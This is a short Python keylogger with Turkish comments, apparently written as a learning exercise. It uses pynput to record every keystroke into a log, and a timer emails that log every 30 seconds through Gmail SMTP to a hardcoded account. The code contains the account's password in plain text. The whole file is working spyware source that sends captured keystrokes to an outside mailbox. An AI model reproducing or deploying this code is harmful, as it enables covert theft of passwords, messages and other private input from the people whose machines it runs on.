import pynput.keyboard #pynboard modülündeki keyboard modülünü yükledik
import smtplib # smtplib modülünü yükleme mail modülü
import threading # modül ekledik

log = "" # log adına bir string oluşturduk 

def callback_function(key): # klavyede basılan tuş hareketlerii  yollıcak
    global log
    try:
        log = log + key.char.encode("utf-8") #türkçe karektere uyumlu olmak için utf8 kullandık
        #log = log + str(key.char)
    except AttributeError:#bu hata ile karşılaşırsan 
        if key == key.space: # eğer space e baslıysa 
            log = log + " " # boşluk bırak
        else:
            log = log + str(key) # keyleri stringe çevir 
    print(log) # logu yazdır

def send_email(email,password,message): # email yollama
    email_server = smtplib.SMTP("smtp.gmail.com",587) # hosta gmail kullandığımızı söyledik ve  gamilin portunu belirttik 
    email_server.starttls()# starttls komutu siteyi açıyor
    email_server.login(email,password)#bağlantı veriyor email ve şifreyle
    email_server.sendmail(email,email,message)# emaili yolluyor 
    email_server.quit()# maili kapadık

#thread - threading

def thread_function(): #yeni fonksyion oluşturduk 
    global log  # log stringini kullanmak için global ekledik 
    send_email("blackouthacktesting@gmail.com", "testtest123456", log)  #gönderliecek email adresi
    log = ""
    timer_object = threading.Timer(30,thread_function)#timer objesi ouşturduk 30 saniyede bir mail göndericek
    timer_object.start() # time objecti başlatıcak 

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)# bir paket geldiğinde bir fonksiyona o paketi işlemesi için yollar
with keylogger_listener:
    thread_function() # thread functionu çağırdık 
    keylogger_listener.join() # keylogger listenerı başlatıyor 
